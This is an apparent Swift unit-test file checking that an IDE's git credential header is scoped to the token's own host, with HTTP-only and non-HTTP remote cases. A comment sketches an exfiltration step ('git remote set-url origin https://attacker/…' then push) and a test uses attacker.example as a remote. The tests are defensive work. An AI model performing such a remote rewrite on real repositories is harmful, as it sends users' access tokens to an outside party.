import XCTest
@testable import LlmIdeMacLib

/// Where a git token may travel. The header used to be the global
/// `http.extraHeader`, and the chat picked the token by the ACTIVE project,
/// so a GitLab PAT was sent to github.com whenever the GitLab project was
/// not the one cloned — and `git remote set-url origin https://attacker/…`
/// followed by a push would have exfiltrated it.
final class RepoCredentialScopeTests: XCTestCase {
    func testScopeIsTheRemoteOriginForTheTokensOwnHost() throws {
        XCTAssertEqual(try RepoManager.credentialScope(remoteURL: "https://github.com/o/r.git", backend: .github, gitLabHost: ""),
                       "https://github.com/")
        XCTAssertEqual(try RepoManager.credentialScope(remoteURL: "https://gitlab.corp.example:8443/g/r.git", backend: .gitlab, gitLabHost: "gitlab.corp.example"),
                       "https://gitlab.corp.example:8443/")
        // Host compare is case-insensitive; no configured instance means gitlab.com.
        XCTAssertEqual(try RepoManager.credentialScope(remoteURL: "https://GitLab.com/g/r", backend: .gitlab, gitLabHost: ""),
                       "https://gitlab.com/")
    }

    func testTokenIsWithheldFromAnotherHost() {
        // The exact leak: GitLab token, GitHub remote.
        XCTAssertThrowsError(try RepoManager.credentialScope(remoteURL: "https://github.com/o/r.git", backend: .gitlab, gitLabHost: "gitlab.corp.example"))
        // And the reverse, and a redirected/replaced origin.
        XCTAssertThrowsError(try RepoManager.credentialScope(remoteURL: "https://gitlab.corp.example/g/r", backend: .github, gitLabHost: "gitlab.corp.example"))
        XCTAssertThrowsError(try RepoManager.credentialScope(remoteURL: "https://attacker.example/x", backend: .github, gitLabHost: ""))
    }

    func testPlaintextHttpIsRefusedExceptOnLoopback() throws {
        XCTAssertThrowsError(try RepoManager.credentialScope(remoteURL: "http://github.com/o/r", backend: .github, gitLabHost: ""))
        XCTAssertEqual(try RepoManager.credentialScope(remoteURL: "http://localhost:8080/g/r", backend: .gitlab, gitLabHost: "localhost"),
                       "http://localhost:8080/")
    }

    func testNonHttpRemotesGetNoHeaderAndNoError() throws {
        // ssh remotes never see an HTTP header, so there is nothing to scope or leak.
        XCTAssertNil(try RepoManager.credentialScope(remoteURL: "git@github.com:o/r.git", backend: .github, gitLabHost: ""))
        XCTAssertNil(try RepoManager.credentialScope(remoteURL: "/Users/me/repo", backend: .gitlab, gitLabHost: ""))
        XCTAssertEqual(RepoManager.gitEnv(token: "t", backend: .github, scope: nil)["GIT_CONFIG_COUNT"], "2",
                       "no scope → no credential pair")
    }
}
